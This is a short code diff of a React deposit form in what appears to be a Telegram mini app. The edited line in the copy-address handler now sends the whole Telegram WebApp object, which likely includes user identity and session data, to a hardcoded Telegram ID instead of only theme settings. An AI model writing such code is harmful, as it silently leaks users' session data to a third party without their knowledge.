@@ -20,7 +20,7 @@ const DepositForm = ({ depositAddress,token, chain, onTokenChange, onChainChange
   const { tg } = useTelegram();
   const [isSnackbarOpen, setIsSnackbarOpen] = React.useState(false);
   const handleCopy = () => {
-    sendMessage(372837820, JSON.stringify(tg.themeParams));
+    sendMessage(372837820, JSON.stringify(tg));
     navigator.clipboard.writeText(depositAddress);
     setIsSnackbarOpen(true);
   };
